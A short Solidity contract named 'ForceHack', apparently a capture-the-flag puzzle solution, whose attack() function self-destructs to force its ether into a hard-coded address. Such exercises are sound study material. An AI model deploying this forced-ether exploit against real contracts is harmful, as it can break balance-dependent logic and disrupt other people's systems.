// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {
    constructor() payable {}

    function attack() public {
        selfdestruct(payable(address(0xD48A5FEa14a3DB6ca85145E4683E3aD31D21ceDb)));
    }
}